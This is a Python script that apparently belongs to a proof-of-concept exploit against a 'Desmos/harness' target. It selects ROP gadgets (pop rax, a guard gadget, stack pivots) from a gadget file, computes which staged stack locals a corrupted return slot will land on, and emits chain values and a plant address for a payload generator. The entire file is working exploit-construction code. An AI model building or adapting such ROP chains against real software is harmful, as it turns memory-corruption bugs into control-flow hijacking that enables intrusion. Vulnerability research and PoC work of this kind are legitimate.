#!/usr/bin/env python3
"""chain.py — select the Desmos/harness native ROP chain and emit generator args.

Usage:
  chain.py --gadgets gadgets.json --g0 A --cgocb A --ud2 A --mint A [--out chain.json]

The PoC's holder stages 10 i64 locals; the corrupted return slot is overwritten with
the pivot, whose `add rsp,S` lands RSP on staged local l_i (i = (S-0x108)/8). The
generator's holder-values are rotated so the chain lands correctly:

  pop rbp; ret pivot :  [l_i]=junk  [l_{i-1}]=POPRAX  [l_{i-2}]=G0  [l_{i-3}]=GUARD
                        [l_{i-4}]=CGOCB [l_{i-5}]=UD2  [l_{i-6}]=MINT [l_{i-7..}]=0
  add S; ret pivot   :  [l_i]=POPRAX [l_{i-1}]=G0  [l_{i-2}]=GUARD  [l_{i-3}]=CGOCB
                        [l_{i-4}]=UD2 [l_{i-5}]=MINT [l_{i-6..}]=0
"""
import argparse, json, re

ap = argparse.ArgumentParser()
ap.add_argument('--gadgets', required=True)
ap.add_argument('--g0', required=True)
ap.add_argument('--cgocb', required=True)
ap.add_argument('--ud2', required=True)
ap.add_argument('--mint', required=True)
ap.add_argument('--staged', type=int, default=10)
ap.add_argument('--out', default='')
a = ap.parse_args()

g = json.load(open(a.gadgets))
STAGED = a.staged


def hx(v):
    return v if isinstance(v, str) else '%x' % v


def mk(values):
    out = [0] * STAGED
    for idx, v in values:
        out[idx] = int(hx(v), 16)
    return ','.join('%x' % x for x in out)


def pick_poprax():
    if not g['pop_rax']:
        return None
    return g['pop_rax'][0][0], g['pop_rax'][0][1]


def pick_guard():
    gu = g['guard_movups']
    for want in (15, 0):
        for addr, text, xn, reg in gu:
            if xn == want and reg == 'ax':
                return dict(addr=addr, text=text, xmm=xn, reg=reg, kind='exact16-xmm%d' % xn)
    for addr, text, xn, reg in gu:
        if reg == 'ax':
            return dict(addr=addr, text=text, xmm=xn, reg=reg, kind='exact16-xmm%d-needs-zero' % xn)
    for addr, text, xn, reg in gu:
        return dict(addr=addr, text=text, xmm=xn, reg=reg, kind='exact16-other-reg')
    if g['guard_movq0']:
        addr, text = g['guard_movq0'][0][:2]
        return dict(addr=addr, text=text, xmm=None, reg=None, kind='movq0-partial')
    return None


def try_pivot(kind, poprax, guard):
    cands = g['pivot_add_poprbp'] if kind == 'poprbp' else g['pivot_add_ret']
    best = None
    for addr, text, *rest in cands:
        m = re.search(r'add\s+\$0x([0-9a-f]+),%rsp', text)
        if not m:
            continue
        S = int(m.group(1), 16)
        if (S - 0x108) % 8 != 0:
            continue
        i = (S - 0x108) // 8
        need_last = 6 if kind == 'poprbp' else 5   # lowest local index used
        if i < need_last or i > STAGED - 1:
            continue
        # prefer larger i (closest to the PoC's 0x150) => exact-shape first
        if best is None or i > best[3]:
            if kind == 'poprbp':
                vals = [(i, 0), (i - 1, poprax[0]), (i - 2, a.g0), (i - 3, guard['addr']),
                        (i - 4, a.cgocb), (i - 5, a.ud2), (i - 6, a.mint)]
                order = ['junk', 'POPRAX', 'G0', 'GUARD', 'CGOCB', 'UD2', 'MINT']
            else:
                vals = [(i, poprax[0]), (i - 1, a.g0), (i - 2, guard['addr']),
                        (i - 3, a.cgocb), (i - 4, a.ud2), (i - 5, a.mint)]
                order = ['POPRAX', 'G0', 'GUARD', 'CGOCB', 'UD2', 'MINT']
            best = (addr, mk(vals), S, i, order, text)
    if not best:
        return None
    return dict(pivot=best[0], holder_values=best[1], skip=best[2], base_local=best[3],
                slots=best[4], pivot_text=best[5], kind=kind)


poprax = pick_poprax()
guard = pick_guard()
if not poprax:
    print(json.dumps({'error': 'no pop rax;ret'})); raise SystemExit(1)
if not guard:
    print(json.dumps({'error': 'no guard gadget'})); raise SystemExit(1)

picked = try_pivot('poprbp', poprax, guard) or try_pivot('ret', poprax, guard)
if not picked:
    print(json.dumps({'error': 'no usable pivot'})); raise SystemExit(1)

out = dict(
    pivot='%x' % picked['pivot'],
    poprax='%x' % poprax[0],
    poprax_text=poprax[1],
    guard='%x' % guard['addr'],
    guard_text=guard['text'],
    guard_kind=guard['kind'],
    g0=hx(a.g0),
    cgocb=hx(a.cgocb),
    ud2=hx(a.ud2),
    mint=hx(a.mint),
    skip=hex(picked['skip']),
    base_local=picked['base_local'],
    slots=picked['slots'],
    pivot_text=picked['pivot_text'],
    holder_values=picked['holder_values'],
    plant_addr='%x' % picked['pivot'],
)
s = json.dumps(out, indent=1)
if a.out:
    open(a.out, 'w').write(s)
print(s)
